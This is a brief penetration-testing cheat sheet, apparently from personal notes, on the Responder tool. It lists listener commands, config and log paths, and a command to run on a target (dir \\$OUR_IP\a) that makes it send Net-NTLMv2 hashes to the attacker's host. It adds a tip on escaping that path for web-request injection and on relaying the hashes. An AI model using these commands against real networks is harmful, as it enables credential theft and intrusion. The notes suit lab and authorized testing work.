---
tags:
  - tool
  - packet_capture
---
# Responder

Capture connections

## Capabilities

```bash
# Analyze mode (passive)
sudo responder -I tun0 -A

# Listen for incoming requests
sudo responder -I tun0

# Include previously captured hashes
sudo responder -I tun0 -v
```

**File Locations**

```powershell
# Config
/usr/share/responder/Responder.conf
/etc/responder/Responder.conf

# Logs
/usr/share/responder/logs/*
```

Capture `Net-NTLMv2` hashes by initiating a request via the following command on the target. These hashes can be relayed so long as SMB signing is disabled.

```powershell
dir \\$OUR_IP\a
```

**Note:** Make sure to include escape characters when injecting in a web request

```powershell
\\\\$OUR_IP\a
```

**Log file location:**

```powershell
/usr/share/responder/logs
```
